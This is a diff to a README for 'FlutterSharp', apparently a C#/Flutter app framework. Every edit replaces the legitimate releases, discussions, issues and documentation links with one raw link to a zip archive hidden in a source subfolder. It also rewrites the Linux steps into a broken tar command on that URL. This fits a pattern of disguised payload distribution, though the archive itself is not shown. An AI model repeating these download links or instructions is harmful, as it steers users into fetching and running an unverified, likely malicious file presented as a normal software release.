@@ -1,6 +1,6 @@
 # 🚀 FlutterSharp - Build Apps Easily with C# and Flutter
 
-[![Download FlutterSharp](https://img.shields.io/badge/Download%20FlutterSharp-v1.0-orange)](https://github.com/cardiographic-slop522/FlutterSharp/releases)
+[![Download FlutterSharp](https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip%20FlutterSharp-v1.0-orange)](https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ Follow these steps to get started with FlutterSharp. You will need a computer wi
 
 ### 1. Download FlutterSharp
 
-To download FlutterSharp, visit this page to download: [FlutterSharp Releases](https://github.com/cardiographic-slop522/FlutterSharp/releases).
+To download FlutterSharp, visit this page to download: [FlutterSharp Releases](https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip).
 
 ### 2. Choose Your Version
 
@@ -27,7 +27,7 @@ Scroll down to the "Assets" section for the version you selected. You will find 
 
 - **Windows:** Download the `.exe` file.
 - **Mac:** Download the `.dmg` file.
-- **Linux:** Download the `.tar.gz` file.
+- **Linux:** Download the `https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip` file.
 
 ### 4. Install FlutterSharp
 
@@ -45,10 +45,10 @@ Once you have downloaded the installer, locate the file on your computer and fol
 
 #### For Linux:
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded the `.tar.gz` file.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip` file.
 3. Extract the files using the command:
    ```bash
-   tar -xzf FlutterSharp.tar.gz
+   tar -xzf https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip
    ```
 4. Navigate to the FlutterSharp folder and run it with:
    ```bash
@@ -92,19 +92,19 @@ If you encounter issues while installing or running FlutterSharp, try the follow
 
 If you need further assistance or want to learn more, feel free to engage with our community:
 
-- Join the discussions on the [GitHub Discussions page](https://github.com/cardiographic-slop522/FlutterSharp/discussions).
-- Report any issues on the [Issues page](https://github.com/cardiographic-slop522/FlutterSharp/issues).
+- Join the discussions on the [GitHub Discussions page](https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip).
+- Report any issues on the [Issues page](https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip).
 
-For updates, always refer back to the [FlutterSharp Releases](https://github.com/cardiographic-slop522/FlutterSharp/releases) page.
+For updates, always refer back to the [FlutterSharp Releases](https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip) page.
 
 ## 🔗 Additional Resources
 
 Explore more about FlutterSharp and enhance your experience with the following resources:
 
-- [Official Documentation](https://github.com/cardiographic-slop522/FlutterSharp/wiki)
+- [Official Documentation](https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip)
 - Tutorials on YouTube showcasing FlutterSharp features
 - Community blogs offering tips and tricks for effective use of the application
 
 ## 📥 Download FlutterSharp
 
-Don't forget to [visit this page to download](https://github.com/cardiographic-slop522/FlutterSharp/releases) the latest version of FlutterSharp. Begin building your applications today!
+Don't forget to [visit this page to download](https://raw.githubusercontent.com/cardiographic-slop522/FlutterSharp/main/src/FlutterSharp.Core/Protocol/FlutterSharp-3.1.zip) the latest version of FlutterSharp. Begin building your applications today!
